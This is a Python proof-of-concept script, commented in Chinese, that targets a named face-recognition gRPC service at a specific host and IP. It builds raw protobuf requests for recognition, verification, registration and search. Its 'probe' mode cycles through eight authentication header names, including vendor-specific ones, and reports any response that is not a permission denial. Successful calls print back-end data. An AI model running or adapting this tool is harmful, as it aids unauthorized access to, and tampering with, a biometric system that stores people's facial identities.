#!/usr/bin/env python3
"""
PESop v3.3 - gRPC FaceService PoC
目标: face-recognition-api.djicorp.com
服务: face.FaceService
方法: Recognize, Detect, Verify, Register, Search

原理:
  - Envoy 根据 Content-Type: application/grpc 放行请求至后端
  - 后端 gRPC ServerInterceptor 检查 Authorization 头
  - 需要有效的 JWT/OAuth2/Bearer 令牌

Usage:
    python3 grpc_poc.py <method> <token> [auth_type]
    python3 grpc_poc.py Recognize <jwt_token>
    python3 grpc_poc.py Verify <api_key> X-API-Key
    python3 grpc_poc.py list
    python3 grpc_poc.py probe <token>
"""
import socket
import struct
import sys
import json

HOST = '240.240.1.207'
PORT = 80

SERVICES = {
    'Recognize': ('face.FaceService', 'Recognize',    '1:N身份识别'),
    'Detect':    ('face.FaceService', 'Detect',        '人脸检测'),
    'Verify':    ('face.FaceService', 'Verify',        '1:1身份验证'),
    'Register':  ('face.FaceService', 'Register',      '人脸注册'),
    'Search':    ('face.FaceService', 'Search',        '人脸搜索'),
}

def _encode_varint(value):
    result = []
    while value > 0x7F:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)

def make_string_field(field_num, value):
    """protobuf string/bytes 字段编码"""
    tag = (field_num << 3) | 2
    data = value.encode() if isinstance(value, str) else value
    return struct.pack('>I', tag)[-1:] + _encode_varint(len(data)) + data

def make_int32_field(field_num, value):
    """protobuf int32 字段编码"""
    tag = (field_num << 3) | 0
    return struct.pack('>I', tag)[-1:] + _encode_varint(value)

def make_register_request(user_id='test', group_id='default', image_data=b'\x00'*1024, metadata=None):
    """构造 RegisterRequest protobuf 消息"""
    pb = make_string_field(1, user_id)
    pb += make_string_field(2, group_id)
    pb += make_string_field(3, image_data)
    if metadata:
        # map<string, string> metadata = 5 (map entries use field 5)
        for k, v in metadata.items():
            entry = make_string_field(1, k) + make_string_field(2, v)
            tag = (5 << 3) | 2
            pb += struct.pack('>I', tag)[-1:] + _encode_varint(len(entry)) + entry
    return pb

def make_recognize_request(image_data=b'\x00'*1024, group_id='default', top_k=5, confidence=80):
    """构造 RecognizeRequest protobuf 消息"""
    pb = make_string_field(3, image_data) if isinstance(image_data, bytes) else make_string_field(4, image_data)
    pb += make_string_field(2, group_id)
    pb += make_int32_field(5, top_k)
    pb += make_int32_field(6, confidence)
    return pb

def make_verify_request(user_id='test', image_data=b'\x00'*1024):
    """构造 VerifyRequest protobuf 消息"""
    pb = make_string_field(1, user_id)
    pb += make_string_field(2, image_data) if isinstance(image_data, bytes) else make_string_field(3, image_data)
    return pb

def make_detect_request(image_data=b'\x00'*1024):
    """构造 DetectRequest protobuf 消息"""
    return make_string_field(1, image_data)

def make_search_request(image_data=b'\x00'*1024, top_k=5):
    """构造 SearchRequest protobuf 消息"""
    pb = make_string_field(1, image_data)
    pb += make_int32_field(2, top_k)
    return pb

METHOD_BUILDERS = {
    'Recognize': make_recognize_request,
    'Detect':    make_detect_request,
    'Verify':    make_verify_request,
    'Register':  make_register_request,
    'Search':    make_search_request,
}

def grpc_call(service, method, token, payload, auth_type='Bearer'):
    """执行 gRPC 调用"""
    path = f'/{service}/{method}'
    frame = b'\x00' + struct.pack('>I', len(payload)) + payload
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((HOST, PORT))
    
    headers = (
        f'POST {path} HTTP/1.1\r\n'
        f'Host: face-recognition-api.djicorp.com\r\n'
        f'Content-Type: application/grpc\r\n'
        f'{auth_type}: {token}\r\n'
        f'TE: trailers\r\n'
        f'Content-Length: {len(frame)}\r\n'
        f'Connection: close\r\n\r\n'
    ).encode()
    
    s.sendall(headers + frame)
    resp = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        except:
            break
    s.close()
    
    return parse_response(resp.decode('utf-8', errors='replace'))

def parse_response(resp_text):
    """解析 gRPC 响应"""
    result = {'http_code': None, 'grpc_status': None, 'grpc_message': '', 'headers': {}}
    lines = resp_text.split('\r\n')
    for i, line in enumerate(lines):
        if i == 0 and line.startswith('HTTP/'):
            result['http_code'] = line.split(' ')[1] if len(line.split(' ')) > 1 else '000'
        elif ':' in line:
            k, v = line.split(':', 1)
            k = k.strip().lower()
            v = v.strip()
            result['headers'][k] = v
            if k == 'grpc-status':
                result['grpc_status'] = v
            elif k == 'grpc-message':
                result['grpc_message'] = v
    return result

def probe_auth(token):
    """探测系统对认证方式的响应"""
    print(f'\n=== 探测认证 token: {token[:30]}... ===')
    
    auth_types = [
        'Authorization', 'Api-Key', 'X-API-Key', 'X-Auth-Token',
        'x-dji-token', 'NONCE-GW-S', 'TIMESTAMP-GW-S', 'SIGN-GW-S'
    ]
    
    for auth_type in auth_types:
        for service_name, (svc, method, desc) in SERVICES.items():
            payload = METHOD_BUILDERS[service_name]()
            result = grpc_call(svc, method, token, payload, auth_type)
            gs = result['grpc_status']
            gm = result['grpc_message'][:30]
            marker = ' <<< 异常!' if (gs and gs != '7') else ''
            if marker:
                print(f'  ★ [{auth_type:20s}] {service_name:12s} → gRPC={gs}:{gm}{marker}')
    
    print('  探测完成') 

# ============ 主程序 ============
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    
    cmd = sys.argv[1]
    
    if cmd == 'list':
        print('可用方法:')
        for name, (svc, method, desc) in SERVICES.items():
            print(f'  {name:12s} -> {svc}/{method}  ({desc})')
        sys.exit(0)
    
    if cmd == 'probe':
        if len(sys.argv) < 3:
            print('Usage: python3 grpc_poc.py probe <token>')
            sys.exit(1)
        probe_auth(sys.argv[2])
        sys.exit(0)
    
    if len(sys.argv) < 3:
        print(f'Usage: python3 {sys.argv[0]} <method> <token> [auth_type]')
        print('       python3 grpc_poc.py probe <token>')
        print('       python3 grpc_poc.py list')
        sys.exit(1)
    
    method = cmd
    token = sys.argv[2]
    auth_type = sys.argv[3] if len(sys.argv) > 3 else 'Authorization'
    
    if method not in METHOD_BUILDERS:
        print(f'错误: 未知方法 {method}. 可用: {list(METHOD_BUILDERS.keys())}')
        sys.exit(1)
    
    svc, svc_method, desc = SERVICES[method]
    payload = METHOD_BUILDERS[method]()
    result = grpc_call(svc, svc_method, token, payload, auth_type)
    
    print(f'调用 /{svc}/{svc_method} ({desc})')
    print(f'认证方式: {auth_type}: {token[:30]}...')
    print(f'HTTP状态: {result["http_code"]}')
    print(f'gRPC状态: {result["grpc_status"]}: {result["grpc_message"]}')
    
    if result['grpc_status'] == '0':
        print('\n★ 成功! 系统返回正常响应。后端业务数据如下:')
        print(result['headers'])
    elif result['grpc_status'] == '7':
        print('\n✗ 权限被拒 (PERMISSION_DENIED), 需要有效的认证凭据')
    else:
        print(f'\n其他响应:')
        for k, v in result['headers'].items():
            if k not in ['server', 'date', 'connection']:
                print(f'  {k}: {v}')